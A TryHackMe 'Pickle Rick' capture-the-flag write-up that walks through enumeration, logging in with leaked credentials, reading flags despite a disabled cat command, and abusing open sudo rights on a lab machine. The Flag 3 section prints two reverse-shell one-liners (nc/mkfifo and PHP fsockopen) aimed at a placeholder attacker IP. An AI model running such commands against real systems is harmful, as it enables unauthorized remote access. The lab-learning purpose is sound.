# Pickle Rick \(L\)

_TryHackMe_ – [**Pickle Rick** **CTF**](https://tryhackme.com/room/picklerick) Write-Up

_topics_: web application security, text manipulation in Linux, sudo permissions

1. **Plan**
2. **Enumeration**
3. **Flag 1**
4. **Flag 2**
5. **Flag 3**

new tools: less

tools: nmapAutomator, dirsearch

## 1\) Plan

We must help Rick turn back into a human by exploiting a webserver and finding the three ingredients he needs. 

## 2\) Enumeration

First things first `./nmapAutomator.sh 10.10.103.66 Basic`

![](.gitbook/assets/image%20%2829%29.png)

 This is a server so lets check for hidden directories`python3 dirsearch.py -u http://10.10.103.66/ -e php,html,txt`

![](.gitbook/assets/image%20%2849%29.png)

We have port 22 open running **ssh** and port 80 open running a typical **http** webserver. We know that we have to find the vulnerability on the webserver and we received three subdirectories of interest \(_/assets, /login.php & /robots.txt_\)

Inspecting the homepage _/index.html_

![Well Rick must&apos;ve been drunk because he left us his username in plaintext. ](.gitbook/assets/image%20%287%29.png)

Inspecting _/robots.txt_

![This is a catchphrase of Rick&apos;s. It may seem invaluable but could be used as a password. ](.gitbook/assets/image%20%2850%29.png)

#### Local Privilege Escalation

We now have a username and a text file with a phrase the owner says often. We know there is a _login.php_ page lets try this **R1ckRul3s:Wubbalubbadubdub** combination

![And we have a low privilege shell on Rick&apos;s webserver. ](.gitbook/assets/image%20%2856%29.png)

## 3\) Flag 1

Our enumeration told us this was an Ubuntu machine, lets attempt to run `ls` and see if it returns anything

![](.gitbook/assets/image%20%2825%29.png)

There are a few interesting files that might help us find the three ingredients. If you attempt to `cat Sup3rS3cretPickl3Ingred.txt`, we get an error that we don't have permission. At first it may seem that we need to be sudo to read the file. Using `ls -la` shows that the user _**ubuntu**_ owns that file but we have read permissions. Rick must have disabled the cat command, lets see if there is another way we can inspect the contents. 

There are numerous ways to output text in Linux. Cat, less, sed, awk, tee, grep, od, echo, more, tail, head...etc. Lets try `less` first:

![Flag 1](.gitbook/assets/image%20%2852%29.png)

this returns the first flag. 

## 4\) Flag 2

We still have certain files that we have not inspected, especially the _clue.txt_ file. 

![](.gitbook/assets/image%20%2828%29.png)

So we are told to simply look around the file system for the second flag. The first flag had specific syntax that might be repeated, lets use `locate Pickl?` to see if we can find it. Nope, locate is disabled too. How about the find command? 

![Nothing here](.gitbook/assets/image%20%2817%29.png)

Although, we can use find to search by permisson and the filename above has 333 in the name. Trying `find / -perm 333` returns nothing though. 

Lets start looking manually in _/home/rick_ then, the file probably does not have the same syntax. 

![A lesson to try easy things first](.gitbook/assets/image%20%2824%29.png)

![This made me laugh pretty hard lol](.gitbook/assets/image%20%2842%29.png)

## 5\) Flag 3

I have a feeling we'll need to be root in order to read this flag, and remember that port 22 is still open. Lets send a reverse shell to ourselves and run LinEnum. 

Both `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attackerIP> 4445 >/tmp/f` and `php -r '$sock=fsockopen("attackerIP",urPort);exec("/bin/sh -i &3 2>&3");'` are disabled so we will have to find another point of entry. 

**Always check for sudo permissions** `sudo -l`

![](.gitbook/assets/image%20%2820%29.png)

Hmm, so ANY user can use **sudo**, lets inspect the _/root_ directory with `sudo ls -la /root`

![](.gitbook/assets/image%20%2815%29.png)

The 3rd ingredient is revealed to be here. There also seems to be ssh keys in this directory, inspecting _/.ssh_ reveals ssh keys for the user ubuntu. 

We could ssh into the machine using the keys as user ubuntu, but remember that **sudo** can be used by **ANY** user. Because Rick just needs the ingredients, we can go ahead and skip attempting to get a shell as root. This would be done by logging into the system with the ssh keys and sending back a shell run with sudo \(root privileges\), or perhaps another exploit found by LinEnum.

We can simply print the contents of the file with less, `sudo less /root/3rd.txt`

![Ok now lets go get our drunk grandpa](.gitbook/assets/image%20%2823%29.png)

